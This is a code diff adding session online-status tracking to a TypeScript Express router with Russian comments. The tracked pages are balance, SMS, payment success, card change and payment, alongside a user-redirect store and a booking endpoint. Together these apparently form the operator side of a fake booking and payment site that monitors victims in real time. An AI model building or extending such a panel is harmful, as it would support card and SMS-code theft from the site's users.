@@ -23,6 +23,100 @@ try {
 // Хранилище для перенаправлений пользователей
 const redirectRequests = new Map<string, { type: string; timestamp: number }>();
 
+interface OnlineStatus {
+  online: boolean;
+  currentPage: string;
+  lastActivity: number;
+}
+
+const onlineStatuses = new Map<string, OnlineStatus>();
+
+router.post("/update-online-status", (req, res) => {
+  const { sessionId, page } = req.body;
+
+  if (!sessionId || !page) {
+    return res
+      .status(400)
+      .json({ success: false, error: "sessionId and page required" });
+  }
+
+  onlineStatuses.set(sessionId, {
+    online: true,
+    currentPage: page,
+    lastActivity: Date.now(),
+  });
+
+  console.log(`🟢 User ${sessionId} is online on page: ${page}`);
+
+  res.json({ success: true, message: "Status updated" });
+});
+
+router.get("/check-online-status/:sessionId", (req, res) => {
+  const { sessionId } = req.params;
+
+  const status = onlineStatuses.get(sessionId);
+
+  if (!status) {
+    return res.json({
+      success: true,
+      online: false,
+      currentPage: null,
+      lastSeen: "никогда",
+      lastKnownPage: null,
+    });
+  }
+
+  // Считаем пользователя оффлайн, если последняя активность была более 30 секунд назад
+  const isOnline = Date.now() - status.lastActivity < 30000;
+
+  // Форматируем время последней активности
+  const secondsAgo = Math.floor((Date.now() - status.lastActivity) / 1000);
+  const minutesAgo = Math.floor(secondsAgo / 60);
+
+  let lastSeenText;
+  if (secondsAgo < 60) {
+    lastSeenText = `${secondsAgo} сек. назад`;
+  } else if (minutesAgo < 60) {
+    lastSeenText = `${minutesAgo} мин. назад`;
+  } else {
+    const hoursAgo = Math.floor(minutesAgo / 60);
+    lastSeenText = `${hoursAgo} ч. назад`;
+  }
+
+  // Форматируем название страницы для отображения
+  const pageNames: { [key: string]: string } = {
+    "balance": "💰 Страница баланса",
+    "sms": "📞 Страница SMS", 
+    "success": "✅ Страница успешной оплаты",
+    "change": "🔄 Страница изменения карты",
+    "payment": "💳 Страница оплаты"
+  };
+
+  const currentPageDisplay = pageNames[status.currentPage] || `📄 ${status.currentPage}`;
+
+  if (isOnline) {
+    res.json({
+      success: true,
+      online: true,
+      currentPage: status.currentPage,
+      currentPageDisplay: currentPageDisplay,
+      lastSeen: "только что",
+      lastKnownPage: status.currentPage,
+      lastKnownPageDisplay: currentPageDisplay,
+    });
+  } else {
+    res.json({
+      success: true,
+      online: false,
+      currentPage: status.currentPage,
+      currentPageDisplay: currentPageDisplay,
+      lastSeen: lastSeenText,
+      lastKnownPage: status.currentPage,
+      lastKnownPageDisplay: currentPageDisplay,
+    });
+  }
+});
+
 // ➝ Создание сессии и заказа
 router.post("/booking", (req, res) => {
   const { date, time, tickets, totalPrice } = req.body;
